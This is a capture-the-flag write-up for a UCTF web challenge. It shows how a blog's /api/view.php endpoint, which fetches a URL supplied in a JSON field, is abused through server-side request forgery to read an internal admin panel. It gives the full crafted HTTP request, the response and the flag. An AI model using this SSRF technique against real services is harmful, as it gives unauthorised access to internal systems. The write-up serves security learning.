# Tags
- SSRF
- PHP

# Intro

Your task is to access the admin panel of E Corp. servers. The admin panel is located at http://admin-panel.local but it's not accessible from the outside.
E Corp. also has a public blog running at https://ecorpblog.uctf.ir
Your task is to access the admin panel.

# Vulnerability

Our goal is to reach  http://admin-panel.local. 
When opening a post we have the following javascript script in the source code:


        const API_PATH = '/api/view.php';

        async function fetchPost(id) {
            const fetchResult = await fetch(API_PATH, {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                    'Content-type': 'application/json'
                },
                body: JSON.stringify({ post: `file:///posts/${id}` })
            });

            const resp = await fetchResult.json();
            if (resp.status == 'success') {
                return resp.post;
            } else {
                throw new Error(resp.msg);
            }
        }

        window.addEventListener('load', async () => {
            const titleEl = document.getElementById('post-title');
            const textEl = document.getElementById('post-text');

            const postId = /[^/]*$/.exec(window.location.pathname)[0];
            if (postId.length == 0) {
                titleEl.innerText = 'Missing post ID';
                return;
            }

            let post;
            try {
                post = await fetchPost(postId);
            } catch (e) {
                titleEl.innerText = e.message;
                return;
            }
            document.title = postId;
            titleEl.innerHTML = `${postId} <span class="blink"> |</span>`;

            textEl.innerText = post;
        });
    
It seems like it gets the user input and send a POST request to /api/view.php with the json body: `{ post: "file:///posts/${id}" }`
By requesting the post it seem like it is fetching the file content of that file.
Lets try to make a payload where the server will fetch the  http://admin-panel.local page, by replicating the POST request made by the server.
The payload:

```
POST /api/view.php HTTP/2
Host: ecorpblog.uctf.ir
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ecorpblog.uctf.ir/view/Azita
Content-Type: application/json
Origin: https://ecorpblog.uctf.ir
Content-Length: 35
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"post":"http://admin-panel.local"}
```

```
HTTP/2 200 OK
Date: Thu, 07 Sep 2023 10:07:46 GMT
Content-Type: application/json
Content-Length: 50
Vary: Accept-Encoding
X-Powered-By: PHP/7.2.34
X-Xss-Protection: 1; mode=block
Server: ArvanCloud
X-Sid: 4101
Server-Timing: total;dur=146
X-Request-Id: 5acd015119dcc719c005076767ac5bd1
Accept-Ranges: bytes

{"status":"success","post":"uctf{4z174_1n_urm14}"}
```

We get the flag: `uctf{4z174_1n_urm14}`